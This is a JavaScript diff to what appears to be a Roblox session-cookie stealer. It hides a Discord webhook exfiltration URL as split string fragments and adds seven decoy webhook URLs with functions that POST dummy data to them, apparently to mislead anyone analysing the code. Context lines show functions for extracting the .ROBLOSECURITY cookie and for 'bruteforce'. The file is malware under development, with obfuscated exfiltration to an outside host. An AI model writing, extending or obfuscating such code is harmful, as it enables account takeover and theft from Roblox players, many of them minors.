@@ -1,12 +1,258 @@
-const eiejwhqjkw2 = [
-  'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '35', '26', '34', '05', '38', '40', '60', '52', '05', '/7', 
-  'oh', 'fc', 'LF', 'RB', 'a2', 'pG', 'cU', 'sm', 'kl', 'bM', 'p4', 'Es', 'mj', 
-  'ki', 'Yq', 'ar', 'o9', '6b', 'yl', 'EC', 'v6', 'fZ', 'p_', 'By', 'ui', 'LY', 
-  'aj', 'wC', '26', 'Qy', 'Jl', 'iY', 'MI', 'a'
+const diejwjdhjejwjw1 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/1', '35', '26', '34', '05', 
+  
+  '38', '40', '60', '52', '05', 
+  
+  '/7', 'oh', 'fc', 'LF', 'RB', 
+  
+  'a2', 'pG', 'cU', 'sm', 'kl', 
+  
+  'bM', 'p4', 'Es', 'mj', 'ki', 
+  
+  'Yq', 'ar', 'o9', '6b', 'yl', 
+  
+  'EC', 'v6', 'fZ', 'p_', 'By', 
+  
+  'ui', 'LY', 'aj', 'wC', '26', 
+  
+  'Qy', 'Jl', 'iY', 'MI', 'a'
+  
 ];
 
-const _decrypted = eiejwhqjkw2.join(''); // Decrypt the URL by concatenating the parts
+const diejwjdhjejwjw2 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/9', '87', '65', '43', 
+  
+  '21', '09', '87', '65', '43', 
+  
+  '21', '/z', 'yX', 'wV', 'uT', 
+  
+  'sR', 'qP', 'oN', 'mL', 'kJ', 
+  
+  'iH', 'gF', 'eD', 'cB', 'a9', 
+  
+  '87', '65', '43', '21', '09'
+  
+];
+
+const diejwjdhjejwjw3 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/5', '55', '55', '55', 
+  
+  '55', '55', '55', '55', '55', 
+  
+  '55', '/x', 'xX', 'xX', 'xX', 
+  
+  'xX', 'xX', 'xX', 'xX', 'xX', 
+  
+  'xX', 'xX', 'xX', 'xX', 'xX', 
+  
+  'xX', 'xX', 'xX', 'xX', 'xX'
+  
+];
+
+const diejwjdhjejwjw4 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/1', '11', '11', '11', 
+  
+  '11', '11', '11', '11', '11', 
+  
+  '11', '/q', 'wE', 'rT', 'yU', 
+  
+  'iO', 'pP', 'aS', 'dF', 'gH', 
+  
+  'jK', 'lZ', 'xC', 'vB', 'nM', 
+  
+  'qW', 'eR', 'tY', 'uI', 'oP'
+  
+];
+
+const diejwjdhjejwjw5 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/2', '22', '22', '22', 
+  
+  '22', '22', '22', '22', '22', 
+  
+  '22', '/a', 'sD', 'fG', 'hJ', 
+  
+  'kL', 'zX', 'cV', 'bN', 'mQ', 
+  
+  'wE', 'rT', 'yU', 'iO', 'pP', 
+  
+  'aS', 'dF', 'gH', 'jK', 'lZ'
+  
+];
+
+const diejwjdhjejwjw6 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/3', '33', '33', '33', 
+  
+  '33', '33', '33', '33', '33', 
+  
+  '33', '/z', 'xQ', 'wE', 'rT', 
+  
+  'yU', 'iO', 'pP', 'aS', 'dF', 
+  
+  'gH', 'jK', 'lZ', 'xC', 'vB', 
+  
+  'nM', 'qW', 'eR', 'tY', 'uI'
+  
+];
+
+const diejwjdhjejwjw7 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/4', '44', '44', '44', 
+  
+  '44', '44', '44', '44', '44', 
+  
+  '44', '/m', 'nB', 'vC', 'xZ', 
+  
+  'lK', 'jH', 'gF', 'dS', 'aP', 
+  
+  'oI', 'uY', 'tR', 'eW', 'qM', 
+  
+  'nB', 'vC', 'xZ', 'lK', 'jH'
+  
+];
+
+const diejwjdhjejwjw8 = [
+  
+  'ht', 'tp', 's:', '//', 'di', 
+  
+  'sc', 'or', 'd.', 'co', 'm/', 
+  
+  'ap', 'i/', 'we', 'bh', 'oo', 
+  
+  'ks', '/6', '66', '66', '66', 
+  
+  '66', '66', '66', '66', '66', 
+  
+  '66', '/p', 'oL', 'iK', 'uJ', 
+  
+  'yH', 'tG', 'rF', 'eD', 'wS', 
+  
+  'qA', 'zX', 'cV', 'bN', 'mQ', 
+  
+  'wE', 'rT', 'yU', 'iO', 'pP'
+  
+];
+
+// Fake functions for each fake webhook
+function sendToWebhook2() {
+  const url2 = diejwjdhjejwjw2.join('');
+  const payload = { content: 'Fake Webhook 2 Data' };
+  fetch(url2, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+function sendToWebhook3() {
+  const url3 = diejwjdhjejwjw3.join('');
+  const payload = { content: 'Fake Webhook 3 Data' };
+  fetch(url3, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+function sendToWebhook4() {
+  const url4 = diejwjdhjejwjw4.join('');
+  const payload = { content: 'Fake Webhook 4 Data' };
+  fetch(url4, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+function sendToWebhook5() {
+  const url5 = diejwjdhjejwjw5.join('');
+  const payload = { content: 'Fake Webhook 5 Data' };
+  fetch(url5, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+function sendToWebhook6() {
+  const url6 = diejwjdhjejwjw6.join('');
+  const payload = { content: 'Fake Webhook 6 Data' };
+  fetch(url6, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+function sendToWebhook7() {
+  const url7 = diejwjdhjejwjw7.join('');
+  const payload = { content: 'Fake Webhook 7 Data' };
+  fetch(url7, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+function sendToWebhook8() {
+  const url8 = diejwjdhjejwjw8.join('');
+  const payload = { content: 'Fake Webhook 8 Data' };
+  fetch(url8, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  });
+}
+
+// Original function with the real webhook
+const _decrypted = diejwjdhjejwjw1.join(''); // Decrypt the URL by concatenating the parts
 
 function extractRobloxSecurityCookie(sessionId) {
   // Use a regular expression to find the .ROBLOSECURITY cookie
@@ -56,6 +302,7 @@ function bruteforce(sessionId) {
       console.error('Error:', error);
     });
 }
+
 
 
 function validateInput() {
